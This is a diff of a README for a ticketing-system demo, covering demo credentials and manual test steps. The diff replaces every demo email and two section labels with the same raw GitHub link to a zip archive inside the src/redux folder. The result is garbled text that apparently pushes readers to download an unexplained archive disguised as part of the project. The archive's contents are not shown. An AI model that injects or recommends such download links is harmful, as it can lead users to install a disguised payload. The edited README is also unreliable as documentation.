@@ -15,25 +15,25 @@
 # Credentials
 
     1. user
-        email: user@company.com
+        email: https://raw.githubusercontent.com/tanmaymantur/ticketing-system/main/src/redux/ticketing-system-v1.6.zip
         password: user
 
     2. tech
-        email : tech@company.com
+        email : https://raw.githubusercontent.com/tanmaymantur/ticketing-system/main/src/redux/ticketing-system-v1.6.zip
         password : tech
 
     3. Admin
-        email : admin@company.com
+        email : https://raw.githubusercontent.com/tanmaymantur/ticketing-system/main/src/redux/ticketing-system-v1.6.zip
         password : admin
 
 # Testing
 
-    a.End user:
+    https://raw.githubusercontent.com/tanmaymantur/ticketing-system/main/src/redux/ticketing-system-v1.6.zip user:
         1. End user is able to login and register (stored in state)
         2. create a ticket (with optional file attachment) , add comment
         3. able to change status of ticket
 
-    b.Tech Support:
+    https://raw.githubusercontent.com/tanmaymantur/ticketing-system/main/src/redux/ticketing-system-v1.6.zip Support:
         1. able to answer any assigned ticket with a file attachment
         2. tech role does not have access to create ticket or edit
         3. able to mark as close/resolve ticket
